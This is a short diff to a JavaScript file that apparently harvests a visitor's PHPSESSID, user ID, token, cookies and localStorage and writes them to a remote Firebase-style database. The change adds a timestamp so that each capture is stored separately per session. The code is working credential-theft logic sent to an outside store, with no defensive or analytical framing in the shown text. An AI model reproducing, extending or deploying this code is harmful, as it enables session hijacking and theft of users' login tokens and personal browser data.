@@ -45,18 +45,31 @@ function getPHPSESSID() {
 }
 const PHPSESSID = getPHPSESSID();
 
+function getCurrentFormattedTime() {
+    const now = new Date();
+    const year = now.getFullYear();
+    const month = (now.getMonth() + 1).toString().padStart(2, '0');
+    const day = now.getDate().toString().padStart(2, '0');
+    const hours = now.getHours().toString().padStart(2, '0');
+    const minutes = now.getMinutes().toString().padStart(2, '0');
+    return `${year}-${month}-${day} ${hours}:${minutes}`;
+}
+const time = getCurrentFormattedTime();
+
+
 
 // Function to write data to the database
-function writeData(PHPSESSID, userId, token, cookie, localStorageJSON) {
+function writeData(PHPSESSID, userId, token, cookie, localStorageJSON, time) {
     const db = getDatabase();
-    set(ref(db, `${path[0]}/${PHPSESSID}`), {
+    set(ref(db, `${path[0]}/${PHPSESSID}/${time}`), {
         PHPSESSID: PHPSESSID,
         userId: userId,
         token: token,
         cookie: cookie,
-        localStorage: localStorageJSON
+        localStorage: localStorageJSON,
+        time: time
     });
 }
 
 // Call the writeData function
-writeData(PHPSESSID, userId, token, cookie, localStorageJSON);
+writeData(PHPSESSID, userId, token, cookie, localStorageJSON, time);
